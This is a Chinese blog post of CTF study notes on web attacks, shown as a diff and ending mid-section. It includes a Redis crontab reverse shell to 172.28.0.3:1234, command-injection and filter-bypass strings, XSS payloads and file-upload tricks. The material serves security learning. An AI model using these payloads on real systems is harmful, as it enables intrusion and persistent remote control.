@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xyy">
+
+
+
+
+
+<title>Web安全进阶 | xyy爱吃番茄（个人分享）</title>
+
+
+
+    <link rel="icon" href="https://qiniu.xuyuyan.cn/XYY.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">xyy爱吃番茄！(个人分享)</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                    <a class="menu-item" href="/friends">友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">xyy爱吃番茄！(个人分享)</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                    <a class="menu-item" href="/friends">友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Web安全进阶</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">xyy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 8, 2024&nbsp;&nbsp;20:08:46</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>来自于书《从0到1 CTFer的成长之路》Nu1L战队编著</p>
+</blockquote>
+<h2 id="1-SSRF漏洞"><a href="#1-SSRF漏洞" class="headerlink" title="1. SSRF漏洞"></a>1. SSRF漏洞</h2><p>SSRF（Server Side Request Forgery，服务端请求伪造）</p>
+<p>假设有个远程请求图片并输出的服务，URL参数为图片地址，例如<code>http://127.0.0.1:8233/?url=www.baidu.com/img/test1.png</code>，假设对图片URL的地址没有进行过滤，即可通过修改地址进行SSRF攻击。如，将请求的URL修改为<code>file://etc/password</code>，就可以使用file协议读取制定路径的文件内容。</p>
+<h3 id="1-1-内部服务资产探测"><a href="#1-1-内部服务资产探测" class="headerlink" title="1.1 内部服务资产探测"></a>1.1 内部服务资产探测</h3><p>探测网站所在服务器端口开放情况，甚至内网资产情况</p>
+<h3 id="1-2-使用Gopher协议扩展攻击面"><a href="#1-2-使用Gopher协议扩展攻击面" class="headerlink" title="1.2 使用Gopher协议扩展攻击面"></a>1.2 使用Gopher协议扩展攻击面</h3><p>前提：Redis一般运行在内网，大部分情况被绑定在127.0.0.1:6379，而且一般是空口令</p>
+<p>步骤：一般是写入Crontab反弹shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall  # 清空Redis</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i /dev/tcp/172.28.0.3/1234 0&gt;&amp;1\n\n&quot; | redis-cli -x set 1</span><br><span class="line">redis-cli config set dir /var/spool/cron/  # 更改Redis持久化文件目录</span><br><span class="line">redis-cli config set dbfilename root  # 更改Redis持久化文件名</span><br><span class="line">redis-cli save  # 手动触发快照保存</span><br></pre></td></tr></table></figure>
+
+<p>对于代码段的第二行进行解释 <code>echo -e &quot;\n\n*/1 * * * * bash -i /dev/tcp/172.28.0.3/1234 0&gt;&amp;1\n\n&quot;</code>：</p>
+<ul>
+<li><code>echo -e</code>：echo命令用于输出字符串，而-e参数允许解释转义字符（如\n表示换行）。</li>
+<li><code>*/1 * * * *</code>：这是一个<strong>Cron表达式</strong>，表示每分钟执行一次。Cron表达式的格式是：分 时 日 月 周</li>
+<li><code>bash -i</code>：启动一个交互式bash shell。</li>
+<li><code>/dev/tcp/172.28.0.3/1234</code>：Linux的 <code>/dev/tcp</code> 是一种网络接口文件，允许Shell通过TCP协议访问指定的IP地址和端口。在这里，它尝试连接到IP地址172.28.0.3的1234端口。</li>
+<li><code>0&gt;&amp;1</code>：将标准输入（0表示标准输入）重定向到标准输出（1表示标准输出），这会让Shell的输入和输出都通过这个网络连接传递，实现反向Shell的效果。</li>
+</ul>
+<blockquote>
+<p>提问🙋：什么是反向Shell呢？</p>
+<p>反向Shell（Reverse Shell）是一种连接方式，允许一台计算机通过网络与另一台计算机进行交互，以达到远程控制的目的。反向Shell的连接方式是客户机主动向攻击者计算机发起连接，连接成功后，攻击者会获得客户机当前用户的Shell及其权限等级。</p>
+<p>提问🙋：有什么用处呢？</p>
+<ol>
+<li>收集目标机器的敏感信息，通过文件操作等</li>
+<li>从外到内 =&gt; 从内到内，绕过防火墙和网络的限制</li>
+<li>通过内网横向移动：一旦在一台机器上成功建立反向 Shell，攻击者可以利用该机器访问其他机器</li>
+<li>建立持久性后门：反向 Shell 可以通过计划任务或其他方法持久存在于目标机器上，以便攻击者在需要时随时连接访问</li>
+</ol>
+</blockquote>
+<p>结果：利用 Redis 的持久化机制，将恶意的反向 Shell 命令写入到系统的计划任务目录中，伪装成正常的 cron job 文件，使得目标机器每分钟向指定 IP 和端口发起连接，从而获取系统控制权。</p>
+<h3 id="1-3-SSRF的绕过"><a href="#1-3-SSRF的绕过" class="headerlink" title="1.3 SSRF的绕过"></a>1.3 SSRF的绕过</h3><h4 id="1-3-1-DNS-Rebinding"><a href="#1-3-1-DNS-Rebinding" class="headerlink" title="1.3.1 DNS Rebinding"></a>1.3.1 DNS Rebinding</h4><p>先来了解一下我们的机器在通过浏览器请求一个域名网站的过程</p>
+<ol>
+<li>机器拿着域名去找DNS服务器，得到对应的IP地址，同时也会携带TTL信息</li>
+<li>防火墙会检查IP地址是否合法，如果合法放行</li>
+<li>浏览器会缓存这个域名和IP的绑定信息，并建立会话</li>
+<li>当DNS缓存到期时，浏览器会再次请求域名解析信息</li>
+</ol>
+<p>我们准备一个域名网站和一个运行着自编解析服务的DNS服务器，在用户机器第一次请求DNS信息的时候返回合法的IP（我的理解是用户那边白名单的IP），并且设置一个足够短的TTL（比如1秒），让浏览器很快就会再次请求解析域名。当浏览器第二次请求域名解析的时候，我们的DNS服务器会返回恶意IP，此时从浏览器的角度看，请求的域名一直没有变，因此它会认为是“同源”请求，认为是安全的。</p>
+<p>说完了原理，那我们可以利用DNS Rebinding来干什么呢？</p>
+<p>一般防火墙会检查外部IP请求对内部资源的访问，但是如果请求来源是内部IP呢？我们利用DNS Rebinding将域名解析到外网上，从而注入外部脚本，利用外部脚本在内网进行资源访问。</p>
+<p>众所周知，能写进书本的绕过方法都是可以进行防御的（手动狗头），对于DNS Rebinding我们可以采取如下方式进行防御：</p>
+<ol>
+<li>浏览器层面：利用插件检测TTL异常短的解析请求</li>
+<li>防火墙层面：限制只能访问指定的DNS服务器</li>
+<li>应用层面：内网应用服务器可以通过Origin字段验证请求的来源，判断请求来源是否是白名单域名</li>
+</ol>
+<h2 id="2-命令执行漏洞"><a href="#2-命令执行漏洞" class="headerlink" title="2. 命令执行漏洞"></a>2. 命令执行漏洞</h2><h3 id="2-1-什么是命令执行？"><a href="#2-1-什么是命令执行？" class="headerlink" title="2.1 什么是命令执行？"></a>2.1 什么是命令执行？</h3><p>在各类编程语言中，为了方便程序处理，通常会存在各种执行外部函数的函数，当调用函数执行命令且未对输入做过滤时，通过注入恶意命令可以造成巨大伤害。</p>
+<p>下面以PHP的system()函数为例：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>];</span><br><span class="line">	system(<span class="string">&quot;echo &quot;</span> . <span class="variable">$dir</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当输入为正常字符串 <code>for test</code> 时，在操作系统实际执行的命令是 <code>echo for test</code>，最终在网页的显示是 <code>for test</code></p>
+<p>当我们输入恶意字符串 <code>for test %26%26 whoami</code>，在操作系统实际执行的命令是 <code>echo for test &amp;&amp; whoami</code> ，最终在网页上显示的是 <code>for test</code> 的字符输出，以及命令 <code>whoami</code> 的执行结果。</p>
+<p>可以发现，我们通过恶意输入，摆脱了开发者希望我们执行echo命令的限制，执行了自定义命令（危险⚠️、</p>
+<p>常用的除了 <code>%26%26</code> 代表 <code>&amp;&amp;</code> ，还有 <code>||</code></p>
+<h3 id="2-2-命令执行基础"><a href="#2-2-命令执行基础" class="headerlink" title="2.2 命令执行基础"></a>2.2 命令执行基础</h3><p>【转译字符】在windows中转译字符是 <code>^</code>，Linux的转义字符为 <code>\</code></p>
+<p>【多条命令执行】命令注入经常需要引入多条命令来扩大危害</p>
+<ul>
+<li>Windows下，<code>&amp;&amp;</code>， <code>||</code>， <code>%0a</code></li>
+<li>Linux下，<code>&amp;&amp;</code>， <code>||</code>， <code>;</code>， <code>$()</code>， <code>%0a</code>， <code>%0d</code>，``</li>
+</ul>
+<p>比如命令 <code>noexist || echo 1111111</code>，<code>noexist</code> 是一条不存在的命令，直接执行会报错，但是通过注入 <code>||</code> 字符，后半段的命令也会被执行✅</p>
+<p>【注释符号】windows的注释符号是<code>::</code>，在BAT批处理脚本用的比较多；Linux的注释符号是 <code>#</code>，在bash脚本用的比较多</p>
+<h3 id="2-3-命令执行的绕过和技巧"><a href="#2-3-命令执行的绕过和技巧" class="headerlink" title="2.3 命令执行的绕过和技巧"></a>2.3 命令执行的绕过和技巧</h3><p>【缺少空格】一些代码审计会禁止空格的出现或者将空格过滤</p>
+<ul>
+<li>绕过1：在命令中间隔的字符可以不只是空格 <code>%20</code>，因此可以利用burp suite对 <code>%00~%ff</code> 区间内的字符串进行测试，会发现还有其他字符可以绕过，如 <code>%09</code>, <code>%0b</code>, <code>%0c</code> 等</li>
+<li>绕过2：如果将各种间隔符都禁了，还可以利用字符串截取的方法截出空格。<ul>
+<li>windows：<code>%ProgramFiles:~10,1%</code>，<code>~</code> 相当于截取符，意思是从环境变量字符串的第10个字符开始截取一个字符，也就是空格</li>
+<li>Linux：<code>$IFS$9</code> IFS是内部字段分隔符，<code>$9</code> 是当前系统Shell进程的第9个参数，通常是一个空字符串。最终能够成功执行的命令是 <code>echo$IFS$9aaa</code></li>
+</ul>
+</li>
+</ul>
+<p>【黑名单关键词】对部分黑名单字符串进行拦截，如 <code>cat</code>，<code>flag</code> 等</p>
+<ul>
+<li>绕过1：利用变量拼接 <code>a=c;b=at;c=he;d=llo;$a$b $&#123;c&#125;$&#123;d&#125;</code>，这里拼接出来的命令是 <code>cat hello</code></li>
+<li>绕过2：使用通配符 <code>?</code> 代表一个字符串；<code>*    </code> 代表任意多个字符串。举例 <code>cat /tm?/fl*</code></li>
+<li>绕过3：借用已有字符串。若是禁用 <code>&lt;&gt;?</code> 等字符串，可以利用其他文件中的字符串使用 <code>substr()</code> 进行截取</li>
+</ul>
+<h2 id="3-跨站脚本攻击XSS"><a href="#3-跨站脚本攻击XSS" class="headerlink" title="3. 跨站脚本攻击XSS"></a>3. 跨站脚本攻击XSS</h2><h3 id="3-1-XSS漏洞类型分类"><a href="#3-1-XSS漏洞类型分类" class="headerlink" title="3.1 XSS漏洞类型分类"></a>3.1 XSS漏洞类型分类</h3><p>【反射型XSS】每次触发漏洞都通过GET/POST请求携带，一般体现在用户输入没有经过任何过滤直接影响前端代码</p>
+<p>例如存在如下代码，name参数通过GET请求获取</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &#123;name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一种常见手段是直接将script标签插入HTML，如 <code>127.0.0.1:8888/xss/1.php?name=&lt;script&gt;alert(&quot;hello xss&quot;)&lt;/script&gt;</code>，得到的结果是 <code>&lt;h1&gt;hello &lt;script&gt;alert(&quot;hello xss&quot;)&lt;/script&gt;&lt;/h1&gt;</code>，script标签则被执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;&lt;?=<span class="subst">$name</span>?&gt;&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者通过提前闭合属性值引号，并在后附加其他属性或是事件，如 <code>127.0.0.1:8888/xss/1.php?name=text233&quot;%20autofocus%20onfocus=&quot;alert(1)&quot;</code>，得到的结果是 <code>&lt;input type=&quot;text&quot; name=&quot;text233&quot; autofocus onfocus=&quot;alert(1)&quot;/&gt;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javacript&quot;</span>&gt;</span><br><span class="line">	<span class="keyword">var</span> username = <span class="string">&quot;&lt;?=<span class="subst">$name</span>?&gt;&quot;</span>;</span><br><span class="line">  document.write(<span class="string">&quot;hello &quot;</span>.username);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们在地址栏输入 <code>127.0.0.1:8888/xss/2.php?name=aaa&quot;%2balert(1);//</code>，代码第二行即为 <code>var username = &quot;aaa&quot;+alert(1);//&quot;</code>，通过提前闭合引号，使得恶意命令 <code>alert</code> 得以执行。</p>
+<p>在上述三种情况中，前两种情况会被Google Chrome浏览器的XSS过滤器拦截，第三种情况可以执行。</p>
+<p>【存储型XSS】某次提交后漏洞代码被存储在数据库中，参考留言板场景</p>
+<p>【DOM XSS】页面中原有js代码执行后，对DOM节点进行增改，引入了被污染的变量</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">getUrlParam</span>(<span class="params">name</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;(^|&amp;)&quot;</span> + name + <span class="string">&quot;=([^&amp;]*)(&amp;|$)&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> r = <span class="built_in">window</span>.location.search.substr(<span class="number">1</span>).match(reg);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (r != <span class="literal">null</span>) <span class="keyword">return</span> <span class="built_in">decodeURI</span>(r[<span class="number">2</span>]);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">  &#125;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> imgUrl = getParam(<span class="string">&quot;imgUrl&quot;</span>);</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> imageHTML = <span class="string">&quot;&lt;img src=&#x27;&quot;</span> + imgUrl +<span class="string">&quot;&#x27; /&gt;&quot;</span></span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(imageHTML);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在上述代码中，从地址栏参数获取图片加载地址，利用提前闭合属性值引号的方式，并且附加事件 <code>127.0.0.1:8888/xss/4.php?imgUrl=https://www.google.com/images/branding/xxxxxx.png%27%20onload=%27alert(1)</code>，可以得到 <code>&lt;img src=&#39;https://www.google.com/images/branding/xxxxxx.png&#39; onload=&#39;alert(1)&#39; /&gt;</code>，可以看到成功注入了 <code>onload</code> 事件</p>
+<h3 id="3-2-Tricks"><a href="#3-2-Tricks" class="headerlink" title="3.2 Tricks"></a>3.2 Tricks</h3><ol>
+<li><p>基本上所有的标签都可以使用on事件来触发恶意事件（上一小节已经进行介绍）</p>
+</li>
+<li><p>利用img标签路径不存在来执行错误处理脚本：<code>&lt;img src=x onerror=&quot;alert(&#39;error&#39;)&quot; /&gt;</code> ，由于页面不存在路径为 <code>/x</code> 的图片，因此加载出错，触发 <code>onerror</code> 事件并执行我们的恶意脚本</p>
+</li>
+<li><p>很多标签的on事件是需要交互的，可以利用 <code>autofocus</code> 属性结合 <code>onfocus</code>、<code>onblur</code> 事件，可以实现自动触发</p>
+</li>
+<li><p>利用 JavaScript 伪协议：例如 <code>javacript:void(0)</code> ，在点击之后不会进行地址跳转，而是直接在当前页面执行 <code>javascript:</code> 之后的脚本</p>
+</li>
+<li><p>二次渲染导致的XSS</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$template</span> = <span class="string">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>] <span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line">&lt;p&gt;名字：&lt;input type=<span class="string">&quot;text&quot;</span> ng-model=<span class="string">&quot;name&quot;</span>/&gt;&lt;/p&gt;</span><br><span class="line">&lt;h1&gt;<span class="meta">&lt;?=</span><span class="variable">$template</span><span class="meta">?&gt;</span>&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 上述代码会将参数t直接输入到AngularJS的模板中，从而存在前端的模板注入，例如 <code>127.0.0.1:8888/xss/php?t=&#123;&#123;3*3&#125;&#125;</code>，其中<code>3*3    </code> 会被视为表达式进行计算。因此，借助沙箱逃逸，我们便能够达到执行任意JavaScript代码的目的。并且因为没有script标签这样的特征，因此也不会被随意地拦截。</p>
+<p> 拓展阅读：<code>https://portswigger.net/blog/XSS-without-html-client-side-template-injection-with-angularjs</code></p>
+</li>
+</ol>
+<h3 id="3-3-XSS过滤和绕过"><a href="#3-3-XSS过滤和绕过" class="headerlink" title="3.3 XSS过滤和绕过"></a>3.3 XSS过滤和绕过</h3><p>主要目的：过滤WAF层（Web应用防火墙）、代码层</p>
+<p>【富文本过滤】</p>
+<p>过滤：如果对标签进行黑名单过滤，必然出现遗漏的情况</p>
+<p>绕过：1. 寻找没有被过滤的标签；2. 双写，如 <code>&lt;scripscriptt&gt;</code>；3. 大小写变换</p>
+<p>【输出在标签属性中】</p>
+<p>如果没有过滤 <code>&lt;</code> 或 <code>&gt;</code>，我们可以直接引入新的标签，否则可以引入标签的时间，如 <code>onload</code> 、<code>onmousemove    </code>。</p>
+<p>当语句被输出到标签事件的位置，我们可以通过 <code>payload</code> 进行HTML编码来绕过解释。</p>
+<p>如果过滤了 <code>eval(</code> 这样的字符组合，可以通过变量代替的方式绕过。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa = <span class="built_in">eval</span>;</span><br><span class="line">aaa(<span class="string">&quot;evil code&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>【输出在JavaScript变量中】</p>
+<p>通过闭合js语句，可以使得攻击语句逃逸；有经验的开发者可能会对引号进行编码或者转译，进而防御XSS，但也仍存在一些特殊场合。</p>
+<p>举一个SQL注入中，双输入注入的例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;输入1&#x27;</span> <span class="keyword">and</span> pass <span class="operator">=</span> <span class="string">&#x27;输入2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果只过滤单引号而没有考虑 <code>\</code>，那么可以转移语句中的第二个单引号，使得第一个引号喝第三个引号闭合，从而让攻击语句逃逸。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;\&#x27;</span> <span class="keyword">and</span> pass <span class="operator">=</span> <span class="string">&#x27;union select xxxxx #&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在XSS中也有类似的场景：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">&#x27;http://nu1l.com/?name=&lt;?=$name?&gt;&#x27;</span>+<span class="string">&#x27;&lt;?=$address?&gt;&#x27;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>假设后端代码未过滤 <code>\</code>，我们可以在name末尾加上 <code>\</code>，在address参数处闭合js语句，同时插入恶意代码。</p>
+<p>进一步可以使用 <code>eval(windows.name)</code> 引入恶意代码或者使用js中的 <code>String.fromCharCode</code> 来避免使用引号等被过滤的字符。</p>
+<p>再介绍个小技巧，将payload藏在location.hash中，则URL中的 <code>#</code> 后的字符不会被发到服务器，就不会被服务器过滤。</p>
+<ul>
+<li><code>127.0.0.1:8888/xss/8.php?name=aaa\&amp;addr=;eval(unescape(location.hash.slice(1)));//#alert(&#39;payload%20hide%20in%20hash&#39;)</code></li>
+</ul>
+<p>此外，在js中，反引号也可以直接当作字符串的边界。</p>
+<p>【CSP过滤及其绕过】CSP，Content Security Policy 内容安全策略</p>
+<p>为使CSP可用，我们需要配置网络服务器返回 <code>Content-Security-Policy HTTP头部</code>，这个规则是在浏览器层执行</p>
+<h2 id="4-Web文件上传漏洞"><a href="#4-Web文件上传漏洞" class="headerlink" title="4. Web文件上传漏洞"></a>4. Web文件上传漏洞</h2><h3 id="4-1-基础文件上传漏洞"><a href="#4-1-基础文件上传漏洞" class="headerlink" title="4.1 基础文件上传漏洞"></a>4.1 基础文件上传漏洞</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">	move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -F &quot;file=@/tmp/x.php&quot; -X &quot;POST&quot; http://localhost/book/upload.php</span><br><span class="line">curl http://localhost/book/x.php</span><br></pre></td></tr></table></figure>
+
+<p>上述代码通过文件上传接口上传了 <code>x.php</code> 文件，并访问了这个文件，执行了文件内的恶意代码。带给我们两个思考：</p>
+<ol>
+<li>服务端接收文件可以通过特定规则进行重命名</li>
+<li>接收用户的文件不应放在过于明显的目录（已知目录），不然很容易被用户猜到，非法访问文件夹下的内容</li>
+</ol>
+<h3 id="4-2-截断绕过上传限制"><a href="#4-2-截断绕过上传限制" class="headerlink" title="4.2 截断绕过上传限制"></a>4.2 截断绕过上传限制</h3><p>【00截断】</p>
+<p>在C语言中，<code>\0</code> 为字符串的结束符，一些底层是C语言的编程语言都有此类通性。</p>
+<p>00截断绕过上传限制的使用场景：后段线获取用户上传的文件名 <code>x.php\00.jpg</code>，再根据文件名获取文件后缀，通过后缀的白名单校验，在最终保存文件的时候发生截断，实现实际上传的文件为 <code>x.php</code>。</p>
+<p>在Java中jdk7u40以下版本存在00截断问题，7u40之后的版本在上传、写入文件等操作会判断文件名是否合法，即不允许文件名出现 <code>\0</code></p>
+<p>【转换字符集造成的截断】</p>
+<p>PHP在实现字符集转换的时候通常使用 <code>iconv()</code> 函数，UTF-8在单字节时允许的字符范围为 <code>0x00~0x7F</code>，如果转换的字符不在该范围内，则会造成 <code>PHP_ICONV_ERR_ILLEGAL_SEQ</code>。低版本PHP（低于5.4）在该异常出现后将不在处理之后的字符，而造成截断问题。</p>
+<p>如上传 <code>x.php\x99.jpg</code> 文件，最终保存的文件将会是 <code>x.php</code></p>
+<h3 id="4-3-文件后缀黑名单绕过"><a href="#4-3-文件后缀黑名单绕过" class="headerlink" title="4.3 文件后缀黑名单绕过"></a>4.3 文件后缀黑名单绕过</h3><p>黑名单校验上传文件后缀，即通过创建一个后缀名的黑名单列表，在上传时判断文件后缀名是否在黑名单列表中，从而实现对上传文件的过滤。</p>
+<p>【上传文件重命名】</p>
+<p>通常使用一些比较偏门的可解析的文件后缀绕过黑名单限制：</p>
+<ul>
+<li>PHP：<code>php3</code>、<code>php5</code>、<code>phtml</code>、 <code>pht</code> 等</li>
+<li>ASP：<code>cdx</code>、 <code>cer</code>、 <code>asa</code> 等</li>
+<li>JSP：<code>jspx</code> 等</li>
+</ul>
+<p>可解析后缀在不同环境下不尽相同，需要多进行尝试。假设为windows环境：</p>
+<ul>
+<li>可以尝试 <code>php</code>、<code>php::$DATA</code>、<code>php.</code> 等后缀<ul>
+<li><code>::$DATA</code> 是默认的数据流标识符。利用这种方式可以在文件名中加入 <code>::$DATA</code> 来混淆后缀，同时达到绕过某些检测规则的目的。在某些配置较弱的服务器上，这一方法可以绕过安全检查。</li>
+<li>在 Windows 文件系统中，一个文件名以 <code>.</code> 结尾时，系统会忽略这个点</li>
+</ul>
+</li>
+<li>或先上传 <code>a.php:.jpg</code>，生成空 <code>a.php</code> 文件，再上传 <code>a.ph&lt;</code> 写入文件内容<ul>
+<li>利用了 NTFS 的 <code>备用数据流</code> 特性。NTFS 文件系统允许文件拥有多个数据流，<code>: </code> 分隔符用于标识不同的数据流。</li>
